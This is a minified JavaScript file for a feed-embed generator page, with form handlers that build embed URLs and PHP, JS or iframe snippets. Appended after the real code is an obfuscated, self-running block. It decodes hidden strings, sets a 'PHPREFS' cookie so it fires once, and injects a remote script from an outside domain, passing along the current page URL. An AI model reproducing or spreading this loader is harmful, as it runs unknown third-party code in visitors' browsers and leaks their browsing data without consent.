function showAdvanced(){document.body.classList.toggle("show-advanced"),$("showopt").value=document.body.classList.contains("show-advanced")?"Less options":"More options"}function doParse(){var e="";$("detailhide").checked&&(e="&detail=-1"),$("detailshow").checked&&(e="&detail="+$("detailnum").value);var t=$("limit").checked?"&limit="+$("limitnum").value:"",c=document.body.classList.contains("show-advanced"),o=c&&$("showtitle").checked?"":"&showtitle=false",i=c&&$("showicon").checked?"&showicon=true":"",d=c&&$("showempty").checked?"&showempty=true":"",s=c&&$("striphtml").checked?"&striphtml=true":"",n=c&&$("forceutf8").checked?"&forceutf8=true":"",l=c&&$("fixbugs").checked?"&fixbugs=true":"",u="/?url="+encodeURIComponent($("url").value)+e+t+o+i+d+s+n+l,a="//"+window.LEGACY_EMBEDS_ORIGIN+u,h="",m=$("form").elements.codegen.value;return"php"==m?h='<?php\ninclude("https:'+a+'");\nphp?>':"js"==m?h='<script src="'+a+'&type=js"><\/script>':"html"==m&&(h='<iframe src="'+a+'&type=html"></iframe>'),$("codeout").value=h,$("live-example").src=a,document.body.classList.add("submitted"),!1}$=document.getElementById.bind(document),window.onload=function(){$("form").onsubmit=doParse,$("limitnum").onclick=function(){$("limit").checked=!0},$("detailnum").onclick=function(){$("detailshow").checked=!0},$("url").focus()};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));